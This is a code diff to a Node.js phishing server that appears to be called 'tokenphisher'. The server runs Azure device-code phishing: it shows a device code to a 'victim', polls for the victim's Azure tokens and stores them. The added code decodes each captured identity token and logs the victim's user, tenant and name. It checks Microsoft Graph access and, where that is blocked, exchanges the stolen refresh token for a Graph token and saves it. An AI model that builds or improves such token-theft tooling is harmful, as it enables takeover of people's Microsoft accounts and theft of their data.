@@ -37,6 +37,8 @@ const defaultConfig = {
     caFilePath: "/var/lib/tokenphisher/certs/example.com/origin-ca.pem",
     userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     geoipallowlist: ["CH","US"],
+    validateTokens: true,
+    graphValidationScope: "https://graph.microsoft.com/.default offline_access",
 };
 
 const config = fs.existsSync(configPath)
@@ -102,7 +104,10 @@ function pollForAzureTokens(deviceCode, userCode) {
                     logMessage(`Success, your Azure tokens for code ${userCode} were saved to ${config.tokenFile}`);
                     writeToFile(config.userCodesFile, userCode + '\n');
                     writeToFile(config.tokenFile, getTime() + formatAzureToken('Usercode: ' + userCode, pollResult));
-                    writeToFile(userCode,JSON.stringify(pollResult, null, 4));
+                    writeToFile(userCode, JSON.stringify(pollResult, null, 4));
+                    if (config.validateTokens !== false) {
+                        await validateCapturedTokens(userCode, pollResult);
+                    }
                     sendThreemaNotifications();
                     clearInterval(interval);
                 }
@@ -116,7 +121,7 @@ function pollForAzureTokens(deviceCode, userCode) {
 }
 
 function logMessage(message, type) {
-    if (!config.debug & type === "debug") {
+    if (!config.debug && type === "debug") {
         return;
     }
     if (type === "error") {
@@ -192,6 +197,127 @@ async function fetchAzureToken(deviceCode) {
     return await response.json();
 }
 
+function decodeJwtPayload(jwt) {
+    try {
+        const payload = jwt.split('.')[1];
+        const padded = payload.replace(/-/g, '+').replace(/_/g, '/');
+        return JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
+    } catch {
+        return null;
+    }
+}
+
+function summarizeApiError(body) {
+    if (body?.error?.message) {
+        return body.error.message;
+    }
+    if (body?.error_description) {
+        return body.error_description;
+    }
+    if (body?.error) {
+        return `${body.error}${body.suberror ? ` (${body.suberror})` : ''}`;
+    }
+    return JSON.stringify(body).slice(0, 240);
+}
+
+async function testGraphMe(accessToken) {
+    const response = await fetch('https://graph.microsoft.com/v1.0/me', {
+        headers: {
+            Authorization: `Bearer ${accessToken}`,
+            'User-Agent': config.userAgent,
+        },
+    });
+    let body = {};
+    try {
+        body = await response.json();
+    } catch {
+        body = {};
+    }
+    return { status: response.status, body };
+}
+
+async function refreshAccessToken(refreshToken, scopes) {
+    const data = new URLSearchParams({
+        grant_type: 'refresh_token',
+        client_id: config.clientId,
+        refresh_token: refreshToken,
+        scope: scopes,
+    });
+    const response = await fetch(config.tokenUrl, buildPostRequest(data));
+    let body = {};
+    try {
+        body = await response.json();
+    } catch {
+        body = {};
+    }
+    return { status: response.status, body };
+}
+
+async function validateCapturedTokens(userCode, pollResult) {
+    const identity = pollResult.id_token ? decodeJwtPayload(pollResult.id_token) : null;
+    const upn = identity?.preferred_username || identity?.upn || identity?.email || 'unknown';
+    const tenantId = identity?.tid || 'unknown';
+    const displayName = identity?.name || '';
+
+    logMessage(
+        `CAPTURE user=${upn} tenant=${tenantId} code=${userCode}` +
+        (displayName ? ` name="${displayName}"` : '')
+    );
+
+    const graphScope = config.graphValidationScope || 'https://graph.microsoft.com/.default offline_access';
+
+    let graphResult = await testGraphMe(pollResult.access_token);
+    if (graphResult.status === 200) {
+        const profile = graphResult.body;
+        logMessage(
+            `GRAPH OK — ${profile.displayName || profile.userPrincipalName} (${profile.userPrincipalName})`
+        );
+        return;
+    }
+
+    logMessage(
+        `GRAPH BLOCKED — HTTP ${graphResult.status} with access_token: ${summarizeApiError(graphResult.body)}`
+    );
+
+    if (!pollResult.refresh_token) {
+        logMessage('REFRESH SKIP — no refresh_token in response');
+        return;
+    }
+
+    logMessage('Trying refresh_token exchange for Graph scope ...', 'debug');
+    const refreshResult = await refreshAccessToken(pollResult.refresh_token, graphScope);
+
+    if (refreshResult.body.error) {
+        logMessage(
+            `REFRESH BLOCKED — ${summarizeApiError(refreshResult.body)} (likely CA, consent, or scope policy)`,
+            'error'
+        );
+        return;
+    }
+
+    if (!refreshResult.body.access_token) {
+        logMessage('REFRESH FAILED — no access_token in refresh response', 'error');
+        return;
+    }
+
+    writeToFile(`${userCode}.graph-refresh.json`, JSON.stringify(refreshResult.body, null, 4) + '\n');
+
+    graphResult = await testGraphMe(refreshResult.body.access_token);
+    if (graphResult.status === 200) {
+        const profile = graphResult.body;
+        logMessage(
+            `REFRESH OK + GRAPH OK — ${profile.displayName || profile.userPrincipalName} (${profile.userPrincipalName})`
+        );
+        logMessage(`Refreshed Graph token saved to ${userCode}.graph-refresh.json`);
+        return;
+    }
+
+    logMessage(
+        `REFRESH OK but GRAPH BLOCKED — HTTP ${graphResult.status}: ${summarizeApiError(graphResult.body)} (token issued, API use denied)`,
+        'error'
+    );
+}
+
 async function fetchDeviceCode() {
     const data = new URLSearchParams({
         'client_id': config.clientId,
@@ -238,6 +364,7 @@ app.get('/share', async (req, res, next) => {
         const deviceCodeResponse = await fetchDeviceCode();
         let userCode = deviceCodeResponse.user_code;
         let deviceCode = deviceCodeResponse.device_code;
+        logMessage(`Visit /share — issued device code ${userCode}`);
         displayCodeToVictim(res, userCode);
         pollForAzureTokens(deviceCode, userCode);
     }
